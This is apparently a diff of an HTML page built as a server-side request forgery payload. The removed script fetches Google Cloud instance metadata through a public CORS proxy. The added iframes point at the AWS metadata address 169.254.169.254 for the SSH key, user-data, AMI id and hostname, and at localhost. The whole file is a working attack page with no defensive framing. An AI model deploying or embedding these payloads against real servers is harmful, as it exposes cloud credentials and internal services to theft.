@@ -1,24 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-<script type="text/javascript">
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://cors-anywhere.herokuapp.com/http://metadata.google.internal/computeMetadata/v1/', true);
-xhr.setRequestHeader('Metadata-Flavor', 'Google');
-xhr.responseType = 'text';
-xhr.setRequestHeader("Origin", "metadata.google.internal");
-xhr.onload = function () {
-    if (xhr.readyState === xhr.DONE) {
-        if (xhr.status === 200) {
-            document.getElementById("demo").innerHTML = xhr.response;
-        }
-    }
-};
-
-xhr.send(null);
-</script>
-</head>
 <body>
-	<p id="demo"></p>
+<iframe src="http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"></iframe>
+<iframe src="http://169.254.169.254/latest/user-data"></iframe>
+<iframe src="http://169.254.169.254/user-data"></iframe>
+<iframe src="http://127.0.0.1"></iframe>
+<iframe src="http://169.254.169.254/latest/meta-data/ami-id"></iframe>
+<iframe src="http://169.254.169.254/latest/meta-data/hostname"></iframe>
 </body>
 </html>
